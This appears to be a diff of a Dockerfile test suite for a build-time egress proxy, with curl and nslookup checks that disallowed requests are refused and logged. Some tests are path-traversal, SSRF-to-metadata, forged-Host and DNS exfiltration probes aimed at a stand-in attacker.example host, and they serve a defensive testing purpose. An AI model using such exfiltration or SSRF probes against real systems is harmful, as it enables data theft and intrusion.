@@ -4,8 +4,9 @@
 # need a package mirror in the allowlist and make every case depend on a
 # public CDN.
 #
-# FROM is deliberately not governed by this engine (see docs/inspect-engine.md),
-# so this pull succeeds whatever the rules say.
+# FROM is deliberately not governed by this engine
+# (see docs/security.md#what-buildkitd-fetches-itself), so this pull
+# succeeds whatever the rules say.
 FROM alpine/curl@sha256:1a4d725751c5bd50297ee243db5d4df8ac5aabdf7030dd40dcec3bc3fdaa1cfa
 
 # The runc wrapper puts the proxy's CA in the system store, so no --insecure is
@@ -31,19 +32,16 @@ ENV C='curl -sS -o /dev/null -w %{http_code} --max-time 10'
 #   allowed_tls_rules:   tlspass.example.com:443
 # ---------------------------------------------------------------------------
 
-# [URL rule - path allowed]
 RUN echo "=== [URL rule - path allowed] ===" && \
     OUT=$($S https://allowed.example.com/public/pkg.tgz) && \
     echo "$OUT" && \
     case "$OUT" in PUBLIC\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
 
-# [URL rule - path outside the rule]
 RUN echo "=== [URL rule - path not allowed] ===" && \
     CODE=$($C https://allowed.example.com/private/secret) && \
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
 
-# [URL rule - method outside the rule]
 # The same URL that a GET may have. Only the method differs, which is what no
 # host-level engine can express.
 RUN echo "=== [URL rule - method not allowed] ===" && \
@@ -51,13 +49,11 @@ RUN echo "=== [URL rule - method not allowed] ===" && \
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
 
-# [URL rule - method allowed]
 RUN echo "=== [URL rule - method allowed] ===" && \
     OUT=$($S -X POST https://api.example.com/v1/thing) && \
     echo "$OUT" && \
     case "$OUT" in API\ POST*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
 
-# [Traversal - normalized before the rules see it]
 # Without normalization the proxy matches /public/ and the origin serves
 # /private/, so a 200 carrying PRIVATE is the failure to catch here.
 RUN echo "=== [Traversal] ===" && \
@@ -65,7 +61,6 @@ RUN echo "=== [Traversal] ===" && \
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
 
-# [Traversal - percent-encoded]
 # `.` is unreserved, so `%2e%2e` only becomes a dot-dot segment once decoded.
 # Decoding after stripping would leave it intact, and this would return
 # PRIVATE with a 200.
@@ -80,7 +75,6 @@ RUN echo "=== [Traversal, encoded] ===" && \
       [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1); \
     done
 
-# [Traversal - backslash, which the URL standard treats as a separator]
 # Raw or encoded, a backslash can climb on an origin that honours it. curl with
 # --path-as-is sends it literally; a conforming client would send `/` instead.
 RUN echo "=== [Traversal, backslash] ===" && \
@@ -92,7 +86,6 @@ RUN echo "=== [Traversal, backslash] ===" && \
       [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1); \
     done
 
-# [Traversal guard does not catch legitimate paths]
 # An encoded slash on its own is how npm asks for a scoped package, and a name
 # may simply contain dots.
 RUN echo "=== [Not traversal] ===" && \
@@ -102,7 +95,6 @@ RUN echo "=== [Not traversal] ===" && \
       case "$OUT" in PUBLIC*) : ;; *) echo "FAILED: refused a legitimate path" && exit 1 ;; esac; \
     done
 
-# [Non-standard TLS port]
 # Nothing declares 9443 as TLS. Reaching the origin there proves both that the
 # listener classified it by content and that the original port survived to the
 # origin connection.
@@ -111,7 +103,6 @@ RUN echo "=== [Non-standard TLS port 9443] ===" && \
     echo "$OUT" && \
     case "$OUT" in PUBLIC\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
 
-# [~regex URL rule - host, port and path all matched]
 # blocked.example.com is otherwise always refused (see [Blocked host] below),
 # so reaching it here proves the ~regex rule itself granted access, split into
 # a host match and a path match the way a plain URL rule already is.
@@ -120,13 +111,11 @@ RUN echo "=== [Regex URL rule - host, port and path all matched] ===" && \
     echo "$OUT" && \
     case "$OUT" in PUBLIC\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
 
-# [~regex URL rule - path outside the rule]
 RUN echo "=== [Regex URL rule - path not allowed] ===" && \
     CODE=$($C https://blocked.example.com:9443/private/secret) && \
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
 
-# [~regex URL rule - the literal port in the rule is enforced, not ignored]
 # Same host and path, default port 443 instead of the rule's 9443: a
 # ~regex rule that failed to carry its port into a real restriction would
 # wrongly let this through as "any port".
@@ -135,7 +124,6 @@ RUN echo "=== [Regex URL rule - default port not covered by the literal-port rul
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
 
-# [~regex URL rule - no port names, so only the scheme's default port matches]
 # A separate ~regex rule on blocked.example.com, /defaultport/ this time,
 # names no port at all. It must match the default port (443) and nothing
 # else: a bare/full check that always resolved "true" would wrongly let
@@ -150,7 +138,6 @@ RUN echo "=== [Regex URL rule - portless rule does not also grant a non-default 
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
 
-# [~regex URL rule - the host half is anchored for the author]
 RUN echo "=== [Regex URL rule - host anchored, path left open] ===" && \
     OUT=$($S https://ok.wildcard.example.com/regexpub/deep/pkg.tgz) && \
     echo "$OUT" && \
@@ -161,7 +148,6 @@ RUN echo "=== [Regex URL rule - neighbouring host refused] ===" && \
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
 
-# [~regex URL rule - a "$" the author wrote is kept]
 RUN echo "=== [Regex URL rule - author's trailing anchor honoured] ===" && \
     OUT=$($S https://ok.wildcard.example.com/regexexact) && \
     echo "$OUT" && \
@@ -172,13 +158,11 @@ RUN echo "=== [Regex URL rule - longer path not covered by the anchored rule] ==
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
 
-# [Host rule - any path, any method]
 RUN echo "=== [Host rule] ===" && \
     OUT=$($S -X DELETE https://sub.wildcard.example.com/anything/at/all) && \
     echo "$OUT" && \
     case "$OUT" in ROOT\ DELETE*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
 
-# [Wildcard host + path rule - path outside the rule]
 # attacker.wildcard.example.com matches only the wildcard host, never the
 # literal sub.wildcard.example.com rule above, so this is covered solely by
 # the path-restricted URL rule. The DNS resolver cannot see the path, so if it
@@ -190,19 +174,16 @@ RUN echo "=== [Wildcard host, path outside the rule] ===" && \
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
 
-# [Wildcard host + path rule - path allowed]
 RUN echo "=== [Wildcard host, path allowed] ===" && \
     OUT=$($S https://attacker.wildcard.example.com/public/pkg.tgz) && \
     echo "$OUT" && \
     case "$OUT" in PUBLIC\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
 
-# [Plaintext host rule]
 RUN echo "=== [HTTP host rule] ===" && \
     OUT=$($S http://allowed.example.com/public/pkg.tgz) && \
     echo "$OUT" && \
     case "$OUT" in PUBLIC\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
 
-# [Blocked host - the full URL is what gets recorded]
 # The query string carries the payload an exfiltration attempt would use, and
 # keeping it is the point: assert-inspect-restrict.sh looks for it verbatim.
 RUN echo "=== [Blocked host] ===" && \
@@ -210,7 +191,6 @@ RUN echo "=== [Blocked host] ===" && \
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
 
-# [Blocked host - a URL the size a signed one really is]
 # A release asset's signed URL runs to about a kilobyte, past the length
 # haproxy cuts a log line at by default. The marker is last on the logged line,
 # so an assertion finding it proves the whole line was recorded.
@@ -220,26 +200,22 @@ RUN echo "=== [Blocked host, long URL] ===" && \
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
 
-# [Allowlisted name that does not resolve]
 # CoreDNS answers every name with the proxy's own address regardless of
-# whether it is allowed, so the build's own lookup always succeeds and this
-# needs no address+forged-Host workaround to reach the proxy: HAProxy's own
-# resolution against the real upstream is what fails here, refusing rather
-# than falling back to any address. [Forged Host] below already covers "the
-# destination comes from our resolution, not the client's" more directly.
+# whether it is allowed, so the build's own lookup always succeeds and the
+# request reaches the proxy: HAProxy's own resolution against the real
+# upstream is what fails here, refusing rather than falling back to any
+# address.
 RUN echo "=== [Name does not resolve] ===" && \
     CODE=$($C https://absent.example.com/) && \
     echo "status=$CODE" && \
     [ "$CODE" = "502" ] || (echo "FAILED: expected 502" && exit 1)
 
-# [Name has AAAA records only]
 # Refused like an absent name, and on every attempt rather than sometimes.
 RUN echo "=== [Name has AAAA records only] ===" && \
     CODE=$($C https://v6only.example.com/) && \
     echo "status=$CODE" && \
     [ "$CODE" = "502" ] || (echo "FAILED: expected 502" && exit 1)
 
-# [Name outside the allowlist is not even looked up]
 # The resolver answers it locally, so the build cannot learn its real address;
 # the request lands on the proxy and is refused there with its URL recorded.
 RUN echo "=== [Name outside the allowlist] ===" && \
@@ -247,7 +223,6 @@ RUN echo "=== [Name outside the allowlist] ===" && \
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
 
-# [Forged Host - the destination is not the client's to choose]
 # Aimed at the impostor by address while claiming an allowed name. The proxy
 # resolves the name itself, so the allowed origin answers and the impostor is
 # never reached.
@@ -260,7 +235,6 @@ RUN echo "=== [Forged Host] ===" && \
       *) echo "FAILED: unexpected body" && exit 1 ;; \
     esac
 
-# [TLS passthrough]
 # Judged on SNI alone and never decrypted, so the build validates the origin's
 # own self-signed certificate: --insecure here is the assertion, not a
 # workaround. A decrypted connection would present the proxy's CA instead,
@@ -270,21 +244,18 @@ RUN echo "=== [TLS passthrough] ===" && \
     echo "$OUT" && \
     case "$OUT" in PUBLIC\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
 
-# [~regex TLS rule - host and its own literal port]
 # Same host as [TLS passthrough], a second port only the ~regex rule names.
 RUN echo "=== [Regex TLS rule] ===" && \
     OUT=$($S --insecure https://tlspass.example.com:8443/public/x) && \
     echo "$OUT" && \
     case "$OUT" in PUBLIC\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
 
-# [DNS-only exfiltration]
 # No connection is ever made, so the resolver's log is the only record. The
 # lookup is expected to fail; what matters is that it was refused and recorded.
 RUN echo "=== [DNS-only exfiltration] ===" && \
     (nslookup SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true) && \
     echo "queried"
 
-# [Service discovery, host allowed]
 # apt asks for this on every repository it fetches from, and falls back to the
 # plain name when nothing comes back. The build works; reporting the lookup as
 # blocked would fail it anyway.
@@ -292,14 +263,12 @@ RUN echo "=== [Service discovery, host allowed] ===" && \
     (nslookup -type=SRV _http._tcp.allowed.example.com >/dev/null 2>&1 || true) && \
     echo "queried"
 
-# [Service discovery, host not allowed]
 # Prefixing `_a._tcp.` must not be a way out of the report, so the verb above
 # is held to names under a host the rules allow.
 RUN echo "=== [Service discovery, host not allowed] ===" && \
     (nslookup -type=SRV _mongodb._tcp.SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true) && \
     echo "queried"
 
-# [Reverse lookup]
 # Nothing in the cage has a name, so the only question is how the lookup ends.
 # A query the resolver leaves unhandled is answered SERVFAIL, which musl reads
 # as a server that may yet answer: it retries and then waits out its whole
@@ -310,7 +279,6 @@ RUN echo "=== [Reverse lookup] ===" && \
     echo "$OUT" && \
     case "$OUT" in *NXDOMAIN*) echo "OK" ;; *) echo "FAILED: expected NXDOMAIN" && exit 1 ;; esac
 
-# [Reverse zone, invented name]
 # Only a name that is an address backwards counts as a reverse lookup. The verb
 # those are logged under is one the report drops, so appending `.in-addr.arpa`
 # to an exfiltration name must not be a way out of the report.
@@ -318,7 +286,6 @@ RUN echo "=== [Reverse zone, invented name] ===" && \
     (nslookup SECRET-IN-A-NAME.in-addr.arpa >/dev/null 2>&1 || true) && \
     echo "queried"
 
-# [A rule may name an address, and it stays inspected]
 # No resolver can answer an address, so the proxy takes one in the Host header
 # as it stands rather than asking. Without that a rule naming an address could
 # never be satisfied, and the only way to reach one would be the uninspected
@@ -344,7 +311,6 @@ RUN echo "=== [Address-shaped but invalid] ===" && \
       [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1); \
     done
 
-# [SSRF - an allowlisted name resolving inward]
 # metadata.example.com is allowlisted but resolves to 169.254.169.254. The name
 # passes the rules; the resolved address must not. Without the guard the proxy
 # would fetch cloud metadata and hand it back.
@@ -353,7 +319,6 @@ RUN echo "=== [SSRF via allowlisted name] ===" && \
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: reached an internal address" && exit 1)
 
-# [SSRF - an allowlisted name resolving back to the runner]
 # Allowlisted, but resolves to an address HOST_ADDRESSES names as the runner's.
 # RFC1918 is exempt on purpose, so only that list refuses it.
 RUN echo "=== [SSRF back to the runner] ===" && \
@@ -361,13 +326,11 @@ RUN echo "=== [SSRF back to the runner] ===" && \
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: reached the runner" && exit 1)
 
-# [Direct address, no ip rule]
 RUN echo "=== [Direct address] ===" && \
     CODE=$($C http://10.200.0.101/) && \
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
 
-# [~regex allowed_ip_rules - uninspected passthrough by address]
 # Port 9080, distinct from the :80 the URL rule above allows.
 RUN echo "=== [Regex IP rule] ===" && \
     OUT=$($S http://10.200.0.100:9080/anything) && \
@@ -381,7 +344,6 @@ RUN echo "=== [Regex IP rule - other port not covered] ===" && \
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
 
-# [UDP is dropped]
 # The cage forwards nothing, so a build cannot leave over UDP: no QUIC, no
 # HTTP/3, no DNS to a resolver of its own choosing. assert-inspect-restrict.sh
 # runs the same probe from beside the echo server, where it must succeed, so a
@@ -391,16 +353,13 @@ RUN echo "=== [UDP] ===" && \
     echo "reply=[$OUT]" && \
     [ -z "$OUT" ] || (echo "FAILED: UDP left the cage" && exit 1)
 
-# [DNS is the one exception]
 # Port 53 is the only UDP the gateway accepts, and only to itself.
 RUN echo "=== [DNS still resolves] ===" && \
     nslookup allowed.example.com >/dev/null 2>&1 && echo "OK"
 
-# [ICMP is dropped]
 RUN echo "=== [ICMP] ===" && \
     (ping -c 1 -W 2 10.200.0.100 >/dev/null 2>&1 && echo "FAILED: ping left the cage" && exit 1) || echo "OK"
 
-# [Package manager - apk has no CA store of its own]
 # apk (like apt/yum) trusts whatever OpenSSL's system store trusts rather than
 # a store of its own. Reusing /public/** as a fake index only exercises the
 # TLS leg: a file-format error proves the handshake (and the rule) passed,
